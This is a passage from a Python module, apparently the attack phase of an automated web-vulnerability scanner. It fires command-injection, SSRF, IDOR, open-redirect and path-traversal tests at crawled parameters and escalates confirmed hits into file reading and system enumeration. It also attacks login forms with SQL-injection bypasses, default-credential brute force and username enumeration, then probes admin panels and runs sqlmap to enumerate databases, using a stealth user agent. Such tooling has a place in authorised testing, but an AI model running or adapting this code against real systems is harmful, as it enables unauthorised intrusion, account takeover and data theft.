                    f"Evidence: '{confirm}' in response", url,
                ))
                confirmed_payload = payload
                break
        except Exception:
            continue

    if confirmed_payload:
        try:
            lfi_f = await _exploit_lfi_read_all(session, url, param, confirmed_payload, push)
            findings.extend(lfi_f)
        except Exception:
            pass

    return findings


async def _test_cmdi(
    session: httpx.AsyncClient,
    url: str,
    method: str,
    fields: List[Dict[str, str]],
    target_field: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    confirmed_payload: Optional[str] = None

    for payload, confirm in CMDI_PAYLOADS:
        try:
            resp, elapsed, _ev = await _send_with_payload(session, url, method, fields, target_field, payload)
            if resp is None:
                continue
            if confirm and confirm in resp.text:
                await push(f"🔥 Command Injection → {url}  param={target_field}", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"OS Command Injection at {url} — parameter '{target_field}'",
                    "attacker/cmdi", payload,
                    f"Evidence: '{confirm}' in response", url,
                    http_evidence=_ev,
                ))
                confirmed_payload = payload
                break
            if confirm is None and elapsed >= 2.5:
                await push(f"🔥 Command Injection (time-based) → {url}  param={target_field}  delay={elapsed:.1f}s", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"OS Command Injection (time-based blind) at {url} — parameter '{target_field}'",
                    "attacker/cmdi-time", payload,
                    f"Response delay: {elapsed:.1f}s", url,
                    http_evidence=_ev,
                ))
                confirmed_payload = payload
                break
        except Exception:
            continue

    if confirmed_payload:
        try:
            enum_f = await _exploit_cmdi_enum(session, url, method, fields, target_field, push)
            findings.extend(enum_f)
        except Exception:
            pass

    return findings


async def _test_ssrf_url(
    session: httpx.AsyncClient,
    url: str,
    param: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    for target in SSRF_TARGETS:
        try:
            new_params = {k: (v[0] if k != param else target) for k, v in params.items()}
            new_url    = urlunparse(parsed._replace(query=urlencode(new_params)))
            resp       = await session.get(new_url, timeout=8)

            if any(c in resp.text for c in SSRF_CONFIRMS):
                confirm = next(c for c in SSRF_CONFIRMS if c in resp.text)
                await push(f"🔥 SSRF → {url}  param={param}  target={target}", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"Server-Side Request Forgery at {url} — parameter '{param}' fetches internal resource",
                    "attacker/ssrf", target,
                    f"Internal response confirmed: '{confirm}'\n{resp.text[:600]}", url,
                ))
                break
        except Exception:
            continue

    return findings


async def _test_idor(
    session: httpx.AsyncClient,
    url: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    segments  = url.rstrip("/").split("/")
    numeric_positions = [i for i, s in enumerate(segments) if s.isdigit()]

    for pos in numeric_positions:
        original_id = int(segments[pos])
        if original_id == 0:
            continue
        try:
            resp_orig = await session.get(url, timeout=8)
            if resp_orig.status_code not in (200, 201):
                continue
            orig_body = resp_orig.text
        except Exception:
            continue

        for delta in [-1, +1, 2, 999, 1337]:
            test_id  = max(1, original_id + delta)
            new_segs = segments[:]
            new_segs[pos] = str(test_id)
            test_url = "/".join(new_segs)
            try:
                resp_test = await session.get(test_url, timeout=8)
                if resp_test.status_code == 200 and resp_test.text != orig_body and len(resp_test.text) > 50:
                    await push(f"🔥 IDOR → {url}  id={original_id} → {test_id}", "HIGH")
                    findings.append(_make_finding(
                        "HIGH",
                        f"Insecure Direct Object Reference at {url} — ID {original_id} → {test_id} returns different data",
                        "attacker/idor", str(test_id),
                        f"Original ID={original_id}, test ID={test_id}\nBody diff confirmed", url,
                    ))
                    break
            except Exception:
                continue

    return findings


async def _test_open_redirect(
    session: httpx.AsyncClient,
    url: str,
    param: str,
    push,
) -> List[Dict]:
    findings: List[Dict] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    redirect_like = any(x in param.lower() for x in ("redirect", "url", "next", "return", "goto", "dest", "location", "forward", "redir", "target"))
    if not redirect_like:
        return findings

    for payload in OPEN_REDIRECT_PAYLOADS:
        try:
            new_params = {k: (v[0] if k != param else payload) for k, v in params.items()}
            new_url    = urlunparse(parsed._replace(query=urlencode(new_params)))
            resp       = await session.get(new_url, timeout=8, follow_redirects=False)
            location   = resp.headers.get("location", "")
            if "evil-phantom-test.invalid" in location:
                await push(f"🔥 Open Redirect → {url}  param={param}", "HIGH")
                findings.append(_make_finding(
                    "HIGH",
                    f"Open Redirect at {url} — parameter '{param}' redirects to external URL",
                    "attacker/redirect", payload,
                    f"Location header: {location}", url,
                ))
                break
        except Exception:
            continue

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  LOGIN ATTACK SUITE  — comprehensive login exploitation
# ═══════════════════════════════════════════════════════════════════════════════

async def _attack_login_comprehensive(
    session: httpx.AsyncClient,
    form: Dict[str, Any],
    push,
) -> List[Dict]:
    """
    Full login attack:
      Phase 1 — SQLi bypass with 25+ payloads
      Phase 2 — Default credential bruteforce (30+ pairs)
      Phase 3 — Username enumeration via response timing/content
    """
    findings: List[Dict] = []
    url    = form.get("url", "")
    method = form.get("method", "POST").upper()
    fields = form.get("fields", [])

    if not url or not fields:
        return findings

    # Identify field names
    username_field = next(
        (f["name"] for f in fields if any(x in f.get("name","").lower()
         for x in ("user","login","email","name","account")) and f.get("type","") != "password"),
        None,
    )
    password_field = next(
        (f["name"] for f in fields if f.get("type","") == "password"
         or "pass" in f.get("name","").lower()),
        None,
    )

    if not username_field:
        return findings

    auth_success_markers = ["logout", "dashboard", "welcome", "sign out", "my account", "profile", "home"]
    auth_fail_markers    = ["invalid", "incorrect", "failed", "wrong", "error", "try again", "denied"]

    # ── Phase 1: SQLi Login Bypass ────────────────────────────────────────────
    await push(f"  🔑 Login attack P1/3 — SQLi bypass ({len(LOGIN_SQLI_PAYLOADS)} payloads) → {url}", "INFO")

    for payload in LOGIN_SQLI_PAYLOADS:
        try:
            data = _benign_form_data(fields)
            data[username_field] = payload
            if password_field:
                data[password_field] = "wrongpassword_phantom"

            if method == "POST":
                resp = await session.post(url, data=data, timeout=10)
            else:
                resp = await session.get(url, params=data, timeout=10)

            body = resp.text.lower()
            if any(x in body for x in auth_success_markers) and not any(x in body for x in auth_fail_markers):
                await push(f"🔥 Auth Bypass (SQLi) → {url}  payload={payload!r}", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"Authentication Bypass via SQL Injection at {url} — field '{username_field}'",
                    "attacker/auth-sqli-bypass", payload,
                    resp.text[:500], url,
                ))
                break
        except Exception:
            continue

    # ── Phase 2: Default Credential Bruteforce ────────────────────────────────
    await push(f"  🔑 Login attack P2/3 — default creds ({len(DEFAULT_CREDS)} pairs) → {url}", "INFO")
    if not password_field:
        # Try guessing
        password_field = next(
            (f["name"] for f in fields if "pass" in f.get("name","").lower()),
            None,
        )

    for uname, passwd in DEFAULT_CREDS:
        try:
            data = _benign_form_data(fields)
            data[username_field] = uname
            if password_field:
                data[password_field] = passwd

            if method == "POST":
                resp = await session.post(url, data=data, timeout=8)
            else:
                resp = await session.get(url, params=data, timeout=8)

            body = resp.text.lower()
            if any(x in body for x in auth_success_markers) and not any(x in body for x in auth_fail_markers):
                await push(f"🔥 Default Creds → {url}  {uname}:{passwd}", "CRITICAL")
                findings.append(_make_finding(
                    "CRITICAL",
                    f"Default Credentials work at {url} — login as '{uname}' with '{passwd}'",
                    "attacker/default-creds", f"{uname}:{passwd}",
                    resp.text[:400], url,
                ))
                # After success, probe admin-only endpoints
                try:
                    for admin_path in ["/admin", "/admin/", "/dashboard", "/api/admin", "/manage", "/control"]:
                        base = url.split("/login")[0].split("/signin")[0].split("/auth")[0]
                        admin_url = base.rstrip("/") + admin_path
                        ar = await session.get(admin_url, timeout=6)
                        if ar.status_code == 200 and any(x in ar.text.lower() for x in ["admin", "manage", "control", "users"]):
                            findings.append(_make_finding(
                                "HIGH",
                                f"Admin panel accessible after default-creds login at {admin_url}",
                                "attacker/admin-access", f"{uname}:{passwd}",
                                ar.text[:300], admin_url,
                            ))
                except Exception:
                    pass
                break
            await asyncio.sleep(0.1)  # small delay to avoid lockout
        except Exception:
            continue

    # ── Phase 3: Username Enumeration ─────────────────────────────────────────
    await push(f"  🔑 Login attack P3/3 — username enumeration → {url}", "INFO")
    probe_users = ["admin", "administrator", "root", "test", "user", "guest", "support"]
    response_lengths: Dict[str, int] = {}
    response_times:   Dict[str, float] = {}

    for uname in probe_users:
        try:
            data = _benign_form_data(fields)
            data[username_field] = uname
            if password_field:
                data[password_field] = "wrongpassword_phantom_1234"
            t0 = time.time()
            if method == "POST":
                resp = await session.post(url, data=data, timeout=8)
            else:
                resp = await session.get(url, params=data, timeout=8)
            response_lengths[uname] = len(resp.text)
            response_times[uname]   = time.time() - t0
        except Exception:
            continue

    if response_lengths:
        lengths = list(response_lengths.values())
        avg_len = sum(lengths) / len(lengths)
        # If one username gives a distinctly different response length → enumerable
        for uname, rlen in response_lengths.items():
            if abs(rlen - avg_len) > 50:
                findings.append(_make_finding(
                    "MEDIUM",
                    f"Username Enumeration at {url} — '{uname}' returns different response (len={rlen} vs avg={avg_len:.0f})",
                    "attacker/user-enum", uname,
                    f"Response length for '{uname}': {rlen} chars (avg: {avg_len:.0f})", url,
                ))
                break

    return findings


async def _run_sqlmap_targeted(
    url: str,
    cookies: Dict[str, str],
    timeout: int,
    push,
) -> List[Dict]:
    if not shutil.which("sqlmap"):
        return []

    findings: List[Dict] = []
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    cmd = [
        "sqlmap", "-u", url,
        "--batch",
        "--level=3",
        "--risk=2",
        "--random-agent",
        "--forms",
        "--dbs",
        "--tables",
        "--technique=BEUST",
        "--timeout=10",
        "--retries=1",
        "--threads=3",
    ]
    if cookie_str:
        cmd += ["--cookie", cookie_str]

    await push(f"  🔧 sqlmap → {url}", "INFO")
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            return findings

        output = stdout.decode("utf-8", errors="replace")

        for line in output.splitlines():
            l = line.strip()
            if not l:
                continue
            if "is vulnerable" in l.lower() or ("parameter" in l.lower() and "injectable" in l.lower()):
                await push(f"  🔥 sqlmap confirmed SQLi → {url}", "CRITICAL")
                findings.append(_make_finding("CRITICAL", f"SQLi confirmed by sqlmap: {l[:200]}", "sqlmap", "", l[:300], url))
            elif "available databases" in l.lower() or "[*]" in l:
                findings.append(_make_finding("CRITICAL", f"sqlmap DB enumeration: {l[:200]}", "sqlmap", "", l[:300], url))
            elif "dump" in l.lower() and ("table" in l.lower() or "column" in l.lower()):
                findings.append(_make_finding("CRITICAL", f"sqlmap data dump: {l[:200]}", "sqlmap", "", l[:300], url))
    except Exception as e:
        log.debug(f"[attacker] sqlmap error: {e}")

    return findings


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

async def run_attack_phase(
    crawl_result: Dict[str, Any],
    base_url: str,
    host: str,
    session_cookies: Dict[str, str],
    broadcast_fn=None,
    timeout_per_tool: int = 180,
) -> List[Dict[str, Any]]:
    """
    Main entry. Called from run_autopilot_scan() after the crawl phase.
    Returns list of finding dicts (same schema as other autopilot findings).
    """
    findings: List[Dict] = []

    async def push(msg: str, severity: str = "INFO"):
        log.info(f"[attacker] {msg}")
        if broadcast_fn:
            try:
                await broadcast_fn({
                    "type":     "attack_log",
                    "message":  msg,
                    "severity": severity,
                    "target":   base_url,
                })
            except Exception:
                pass

    form_endpoints = crawl_result.get("form_endpoints",  []) or []
    visited_urls   = crawl_result.get("visited_urls",    []) or []
    traffic_log    = crawl_result.get("traffic_log",     []) or []

    await push(
        f"⚔️  Attack phase started — {len(form_endpoints)} forms, "
        f"{len(visited_urls)} URLs, {len(session_cookies)} session cookies"
    )

    cookie_str   = "; ".join(f"{k}={v}" for k, v in session_cookies.items())
    base_headers = {"User-Agent": _STEALTH_UA, "Accept-Language": "en-US,en;q=0.9"}
    if cookie_str:
        base_headers["Cookie"] = cookie_str

    async with httpx.AsyncClient(
        verify=False,
        timeout=16.0,
        headers=base_headers,
        follow_redirects=True,
    ) as session:

        # ── 1. Login-specific attacks (comprehensive) ─────────────────────────
        login_forms = [
            f for f in form_endpoints
            if any(x in str(f.get("url","")).lower() for x in ("login","signin","auth","logon","sign-in","account/login"))
        ]
        if login_forms:
            await push(f"  🔑 Found {len(login_forms)} login form(s) — running comprehensive login attack", "INFO")
            for lf in login_forms[:3]:
                try:
                    login_f = await _attack_login_comprehensive(session, lf, push)
                    findings.extend(login_f)
                except Exception as e:
                    await push(f"  ⚠ Login attack error: {e}", "INFO")

        # ── 2. Test all form endpoints ────────────────────────────────────────
        tested_form_count = 0
        for form in form_endpoints:
            url    = str(form.get("url") or "")
            method = str(form.get("method") or "GET").upper()
            fields = list(form.get("fields") or [])

            if not url or not fields or method not in ("GET", "POST"):
                continue
            if host not in url:
                continue

            tested_form_count += 1
            await push(f"  📋 Form {tested_form_count}: {method} {url} ({len(fields)} fields)")

            for field in fields:
                fname = str(field.get("name") or "").strip()
                ftype = str(field.get("type") or "text").lower()
                if not fname or ftype in ("submit", "button", "reset", "file", "hidden", "checkbox", "radio"):
                    continue

                await push(f"    🎯 {method} {url} param={fname}")

                # Run all attack types on this parameter
                for attack_fn in [_test_sqli, _test_xss, _test_ssti, _test_cmdi]:
                    try:
                        f = await attack_fn(session, url, method, fields, fname, push)
                        findings.extend(f)
                    except Exception:
                        continue
                await asyncio.sleep(0.05)

        # ── 3. URL parameters from traffic log ────────────────────────────────
        tested_params: set = set()
        for item in traffic_log[:400]:
            url = str(item.get("url") or "")
            if "?" not in url or "=" not in url:
                continue
            if host not in url:
                continue

            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in params:
                key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}|{param}"
                if key in tested_params:
                    continue
                tested_params.add(key)

                await push(f"    🎯 GET {url} param={param}")
                findings.extend(await _test_traversal_url(session, url, param, push))
                findings.extend(await _test_ssrf_url(session, url, param, push))
                findings.extend(await _test_open_redirect(session, url, param, push))
                await asyncio.sleep(0.05)

        # ── 4. IDOR testing ───────────────────────────────────────────────────
        await push("  🔢 Testing IDOR (numeric ID enumeration)…")
        idor_tested: set = set()
        for url in visited_urls[:200]:
            segments = urlparse(url).path.split("/")
            if not any(s.isdigit() for s in segments):
                continue
            norm = re.sub(r"/\d+", "/{id}", urlparse(url).path)
            if norm in idor_tested:
                continue
            idor_tested.add(norm)
            try:
                findings.extend(await _test_idor(session, url, push))
            except Exception:
                pass
            await asyncio.sleep(0.05)

        # ── 5. Targeted sqlmap on POST endpoints + URL params ─────────────────
        post_forms  = [f for f in form_endpoints if f.get("method","").upper() == "POST"]
        url_params  = list({
            str(item.get("url",""))
            for item in traffic_log[:100]
            if "?" in str(item.get("url","")) and host in str(item.get("url",""))
        })
        sqlmap_targets = [f["url"] for f in post_forms[:4]] + url_params[:4]

        if sqlmap_targets:
            await push(f"  🔧 Targeted sqlmap on {len(sqlmap_targets)} endpoint(s)…")
            for target_url in sqlmap_targets:
                try:
                    sql_f = await _run_sqlmap_targeted(target_url, session_cookies, timeout_per_tool, push)
                    findings.extend(sql_f)
                except Exception:
                    pass

    total = len(findings)
    crits = sum(1 for f in findings if f["severity"] == "CRITICAL")
    highs = sum(1 for f in findings if f["severity"] == "HIGH")

    await push(
        f"⚔️  Attack phase complete — {total} finding(s) "
        f"[CRITICAL:{crits}  HIGH:{highs}  OTHER:{total-crits-highs}]",
        "CRITICAL" if crits > 0 else ("HIGH" if highs > 0 else "INFO"),
    )

    return findings
